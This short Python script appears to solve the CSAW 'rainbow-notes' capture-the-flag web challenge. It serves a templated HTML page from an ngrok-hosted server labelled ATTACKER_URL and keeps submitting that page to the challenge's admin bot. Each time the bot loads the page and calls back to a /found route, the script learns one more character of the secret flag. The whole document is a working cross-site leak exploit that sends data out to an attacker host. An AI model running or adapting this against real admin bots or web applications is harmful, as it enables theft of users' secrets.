import asyncio

import requests
from aiohttp import web

ATTACKER_URL = "https://33b5-128-211-251-127.ngrok-free.app/"
TARGET_URL = "https://rainbow-notes.csaw.io/"
ADMIN_URL = "http://rainbow-notes-bot.csaw.io:8000/submit"
#ADMIN_URL = "http://localhost:8000/submit"

char = None
found = False
flag = None

with open("rainbow5.html") as f:
	template = f.read()

routes = web.RouteTableDef()

@routes.get("/found")
def found_route(request):
	global found
	found = True
	print("hello", char)
	return web.Response(body="")

@routes.get("/html")
def html_route(request):
	return web.Response(
		body=template.replace("CHAR", repr(char)).replace("FLAG",
		repr(flag)).replace("ATTACKER_URL",
		repr(ATTACKER_URL)).replace("TARGET_URL", repr(TARGET_URL)),
		content_type='text/html'
	)

async def main():
	global char
	global found
	global flag
	
	app = web.Application()
	app.add_routes(routes)
	runner = web.AppRunner(app)
	await runner.setup()
	site = web.TCPSite(runner, '0.0.0.0', 5000)
	await site.start()
	
	flag = "csawctf{"
	for i in range(1, 20):
		for char in "abcdef0123456789{}":
			print(char)
			found = False
			url = ATTACKER_URL + "html"
			requests.post(ADMIN_URL, data={"url": url})
			await asyncio.sleep(10)
			if found:
				flag += char
				print("found", flag)
				break

asyncio.run(main())
